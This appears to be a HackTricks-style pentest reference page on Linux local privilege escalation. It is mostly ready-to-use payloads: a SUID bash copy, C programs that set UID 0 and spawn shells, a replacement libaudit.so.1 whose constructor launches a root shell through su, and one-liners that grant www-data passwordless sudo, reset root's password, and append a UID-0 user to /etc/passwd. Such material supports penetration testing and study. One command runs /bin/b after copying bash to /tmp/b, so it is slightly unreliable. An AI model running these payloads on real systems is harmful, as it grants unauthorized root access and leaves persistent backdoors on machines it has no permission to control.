# Payloads to execute

{{#include ../../banners/hacktricks-training.md}}

## Bash

`bash -p` enables privileged mode: when Bash starts with different real and effective IDs, it does not reset the effective ID to the real ID. The resulting shell still depends on the caller's existing credentials.<sup>[[1]](#references)[[3]](#references)</sup>

```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```

## C

`setresuid` changes the real, effective, and saved IDs when permitted, while `setuid` changes the effective ID and may also set the real and saved IDs for a privileged caller. `execve` replaces the current process image with the requested program.<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup> These examples omit return-value checks; both credential calls can fail even for UID 0.<sup>[[2]](#references)[[3]](#references)</sup>

```c
//gcc payload.c -o payload
int main(void){
    setresuid(0, 0, 0); //Set as user suid user
    system("/bin/sh");
    return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
    setuid(getuid());
    system("/bin/bash");
    return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    char *const paramList[10] = {"/bin/bash", "-p", NULL};
    const int id = 1000;
    setresuid(id, id, id);
    execve(paramList[0], paramList, NULL);
    return 0;
}
```

## Overwriting a file to escalate privileges

### Common files

These are common local privilege-control files and interfaces: `/etc/passwd` stores seven-field account records, `/etc/shadow` stores optional encrypted password data, `sudoers` defines sudo privileges and tags such as `NOPASSWD`, and Docker's default daemon endpoint is a Unix socket at `/var/run/docker.sock`; access to that socket can grant root-level control of its host.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Add user with password to _/etc/passwd_
- Change password inside _/etc/shadow_
- Add user to sudoers in _/etc/sudoers_
- Abuse docker through the docker socket, usually in _/run/docker.sock_ or _/var/run/docker.sock_

### Overwriting a library

Check which shared libraries a binary uses; in this example, inspect `/bin/su` with `ldd`.<sup>[[9]](#references)</sup>

```bash
ldd /bin/su
        linux-vdso.so.1 (0x00007ffef06e9000)
        libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
        libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
        libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
        libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```

`ldd` reports shared-object dependencies, while the dynamic linker uses ELF metadata and its search rules to load them at runtime.<sup>[[9]](#references)[[10]](#references)</sup>

To inspect one candidate, use `objdump -T` to print the dynamic symbol table of `su` and filter for audit names.<sup>[[11]](#references)</sup>

```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```

`audit_open`, `audit_log_user_message`, and `audit_log_acct_message` are libaudit functions; `audit_fd` is shown as a data object defined in `su`'s `.bss` in this output.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup> A replacement library must export compatible definitions for the undefined symbols that the loader resolves; mismatched function/data ABIs can still make the process fail when those symbols are relocated or called.<sup>[[10]](#references)[[11]](#references)</sup>

GCC's `constructor` attribute causes `inject` to be called automatically before `main` on supported targets.<sup>[[15]](#references)</sup>

```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```

If the replacement is loaded successfully by a privileged **`/bin/su`** process, this constructor can start **`/bin/bash`** with that process's privileges; the exact result is environment-dependent.<sup>[[10]](#references)[[15]](#references)</sup>

## Scripts

Can you make root execute something?

`sudoers` uses the `NOPASSWD` tag in policy entries, `chpasswd` reads `user:password` pairs from standard input, and `/etc/passwd` uses seven colon-separated account fields; the following examples assume the relevant files are writable by the process that runs them.<sup>[[5]](#references)[[6]](#references)[[16]](#references)</sup>

### **www-data to sudoers**

```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```

### **Change root password**

```bash
echo "root:hacked" | chpasswd
```

### Add new root user to /etc/passwd

The final payload depends on a target that accepts the generated `crypt` hash: Debian's `mkpasswd -m sha-512` maps to SHA-512 crypt (`$6$`), while OpenSSL's `passwd -1 -salt` uses the MD5-based BSD algorithm (`$1$`).<sup>[[17]](#references)[[18]](#references)</sup>

```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```

## References

- [1] [The Set Builtin (Bash Reference Manual)](https://www.gnu.org/s/bash/manual/html_node/The-Set-Builtin.html)
- [2] [setresuid(2) — Linux manual page](https://man7.org/linux/man-pages/man2/setresuid.2.html)
- [3] [setuid(2) — Linux manual page](https://man7.org/linux/man-pages/man2/setuid.2.html)
- [4] [execve(2) — Linux manual page](https://man7.org/linux/man-pages/man2/execve.2.html)
- [5] [passwd(5) — Linux manual page](https://man7.org/linux/man-pages/man5/passwd.5.html)
- [6] [sudoers(5) — Debian Manpages](https://manpages.debian.org/testing/sudo/sudoers.5.en.html)
- [7] [Protect the Docker daemon socket](https://docs.docker.com/engine/security/protect-access/)
- [8] [dockerd — Docker Docs](https://docs.docker.com/reference/cli/dockerd/)
- [9] [ldd(1) — Linux manual page](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [10] [ld.so(8) — Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [11] [objdump (GNU Binary Utilities)](https://sourceware.org/binutils/docs/binutils/objdump.html)
- [12] [audit_open(3) — Debian Manpages](https://manpages.debian.org/trixie/libaudit-dev/audit_open.3.en.html)
- [13] [audit_log_user_message(3) — Debian Manpages](https://manpages.debian.org/testing/libaudit-dev/audit_log_user_message.3.en.html)
- [14] [audit_log_acct_message(3) — Debian Manpages](https://manpages.debian.org/testing/libaudit-dev/audit_log_acct_message.3.en.html)
- [15] [Common Attributes (Using the GNU Compiler Collection)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [16] [chpasswd(8) — Linux manual page](https://man7.org/linux/man-pages/man8/chpasswd.8.html)
- [17] [mkpasswd.c — Debian Sources](https://sources.debian.org/src/whois/5.5.17/mkpasswd.c)
- [18] [openssl-passwd — OpenSSL Documentation](https://docs.openssl.org/master/man1/openssl-passwd/)

{{#include ../../banners/hacktricks-training.md}}
